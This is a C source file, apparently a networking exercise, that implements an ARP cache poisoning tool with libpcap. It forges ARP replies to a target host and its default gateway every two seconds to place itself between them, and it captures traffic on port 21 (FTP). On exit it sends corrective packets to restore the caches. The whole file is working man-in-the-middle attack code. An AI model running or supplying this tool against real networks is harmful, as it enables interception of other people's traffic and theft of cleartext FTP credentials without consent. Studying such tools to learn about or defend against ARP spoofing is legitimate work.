#include <ft_arp.h>

volatile sig_atomic_t g_running = true;
pcap_t  *g_handle_send = NULL;
pcap_t  *g_handle_capture = NULL;
struct  bpf_program g_fp;
char    *g_gateway_mac = NULL;
char    *g_gateway_ip = NULL;
char    *g_target_ip = NULL;
char    *g_target_mac = NULL;

void cleanup()
{
	t_arp_packet		correct_arp_packetto_gateway;
	t_arp_packet		correct_arp_packetto_target;

	bzero(&correct_arp_packetto_gateway, sizeof(t_arp_packet));
	bzero(&correct_arp_packetto_target, sizeof(t_arp_packet));
	fill_packet(&correct_arp_packetto_gateway, g_gateway_ip, g_gateway_mac, g_target_ip, g_target_mac);
	fill_packet(&correct_arp_packetto_target, g_target_ip, g_target_mac, g_gateway_ip, g_gateway_mac);

	if (g_handle_send  && g_gateway_ip && g_gateway_mac && g_target_ip && g_target_mac) {
		for (int i = 0; i < 5; i++) {
			pcap_send_packet(&correct_arp_packetto_gateway, g_handle_send);
			pcap_send_packet(&correct_arp_packetto_target, g_handle_send);
			sleep(1);
		}
	}
	if (g_handle_send) {
		pcap_close(g_handle_send);
		g_handle_send = NULL;
		
	}
	if (g_handle_capture)
	{	
		pcap_freecode(&g_fp);
		pcap_close(g_handle_capture);
		g_handle_capture = NULL;
	}

	free(g_gateway_mac);
	exit(1);
}

void sigint_handler(int signum) 
{
	(void)signum;
	printf("enter her signal");
	g_running = false;
}

void	running_loop(t_arp_packet	*arp_packet_to_target, t_arp_packet *arp_packet_to_gateway, const char *interface, const char *source_ip)
{
	int					packet_captured_count;
	fd_set				read_fds;
	char				errbuf[PCAP_ERRBUF_SIZE];
	char filter_exp[] = "port 21";
	int					capture_fd;
	int					send_fd;
	int					max_fd;
	int					ret_fds;
	struct				timeval tv;
	time_t				last_send_time = 0;

	g_handle_send = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);	
	if (g_handle_send == NULL)
	{
		fprintf(stderr, "Couldn't open device %s: %s\n", interface, errbuf);
		return;
	}
	g_handle_capture = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	if (g_handle_capture == NULL)
	{
		fprintf(stderr, "Couldn't open device %s: %s\n", interface, errbuf);
		return;
	}
	if (pcap_setnonblock(g_handle_capture, 1, errbuf) < 0 
		|| pcap_setnonblock(g_handle_send, 1, errbuf) < 0)
	{
		fprintf(stderr, "Error setting non-blocking mode: %s\n", errbuf);
		return;
	}
	if (pcap_compile(g_handle_capture, &g_fp, filter_exp, 0, inet_addr(source_ip)) == -1)
	{
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(g_handle_capture));
		return;

	}
	if (pcap_setfilter(g_handle_capture, &g_fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(g_handle_capture));
		return;
	}

	capture_fd = pcap_get_selectable_fd(g_handle_capture);
	send_fd = pcap_get_selectable_fd(g_handle_send);

	if (capture_fd == -1 || send_fd == -1) {
		fprintf(stderr, "Error getting selectable fd\n");
		return;
	}
	while (g_running)
	{
		FD_ZERO(&read_fds);
		FD_SET(capture_fd, &read_fds);
		FD_SET(send_fd, &read_fds);
		tv.tv_sec = 1;
        tv.tv_usec = 0;
		max_fd = (capture_fd > send_fd) ? capture_fd : send_fd;
		ret_fds = select(max_fd + 1, &read_fds, NULL, NULL, &tv);
		if (ret_fds < 0)
		{
			perror("select() failed");
			break;
		}
		if (FD_ISSET(capture_fd, &read_fds))
		{
			packet_captured_count = pcap_dispatch(g_handle_capture, -1, packet_handler, NULL);
			if (packet_captured_count == -1)
			{
				fprintf(stderr, "Error capturing packets: %s\n", pcap_geterr(g_handle_capture));
				continue;
			}
		}
		time_t current_time = time(NULL);
		if (current_time - last_send_time >= 2)
		{
			if (pcap_sendpacket(g_handle_send, (const unsigned char*)arp_packet_to_target, 
							sizeof(t_arp_packet)) != 0)
			{
				fprintf(stderr, "Error sending packet to target: %s\n", pcap_geterr(g_handle_send));
			}
			
			if (pcap_sendpacket(g_handle_send, (const unsigned char*)arp_packet_to_gateway, 
							sizeof(t_arp_packet)) != 0)
			{
				fprintf(stderr, "Error sending packet to gateway: %s\n", pcap_geterr(g_handle_send));
			}
			
			last_send_time = current_time;
		}
	}
}

int main(int ac, char **av)
{
	char				*interface;;
	t_arp_packet		arp_packet_to_target;
	t_arp_packet		arp_packet_to_gateway;

	interface = "eth0";
	if (ac != 5){
		print_error("Please enter the Ip source, the Mac source, the target Ip source, The Mac source.\n -> Examples :192.168.10.45, aa.bb.cc.dd.ee.ff, 192.168.10.47, a0.b0.c0.d0.e0.f0\n");
	}
	
	if (signal(SIGINT, sigint_handler) == SIG_ERR) {
		printf("Error setting signal handler\n");
		return (2);
	}
	if (signal(SIGTERM, sigint_handler) == SIG_ERR)
	{
		printf("Error seeting signal handler\n");
		return (2);
	}
	
	is_valid_ip_addr(av[1]);
	is_valid_ip_addr(av[3]);
	is_valid_mac_addr(av[2]);
	is_valid_mac_addr(av[4]);

	g_target_ip = av[3];
	g_target_mac = av[4];
	bzero(&arp_packet_to_target, sizeof(t_arp_packet));
	bzero(&arp_packet_to_gateway, sizeof(t_arp_packet));
	g_gateway_ip = get_default_gateway_ip(interface);
	if (g_gateway_ip == NULL )
	{
		return(-1);
	}
	g_gateway_mac = get_default_gateway_mac(g_gateway_ip);
	if (g_gateway_mac == NULL)
	{
		return (-1);
	}
	fill_packet(&arp_packet_to_target, g_gateway_ip, av[2], av[3], av[4]);
	fill_packet(&arp_packet_to_gateway, av[3], av[2], g_gateway_ip, g_gateway_mac);
	// print_packet_info(&arp_packet_to_target);
	// print_packet_info(&arp_packet_to_gateway);

	// dump_packet_hex(&arp_packet_to_target);
	// dump_packet_hex(&arp_packet_to_gateway);
	running_loop(&arp_packet_to_target, &arp_packet_to_gateway, interface, av[1]);
	cleanup();
	return (0);
}
